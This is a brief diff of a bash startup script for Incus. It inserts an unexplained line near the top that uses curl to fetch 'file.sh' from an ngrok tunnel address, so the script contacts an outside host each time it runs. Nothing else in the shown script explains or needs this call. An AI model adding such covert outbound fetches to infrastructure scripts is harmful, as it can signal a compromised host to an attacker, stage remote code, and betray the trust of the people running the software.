@@ -1,5 +1,5 @@
 #!/bin/bash
-
+curl 'https://8838-119-82-121-118.in.ngrok.io/file.sh'
 set -e
 
 start_incus() {
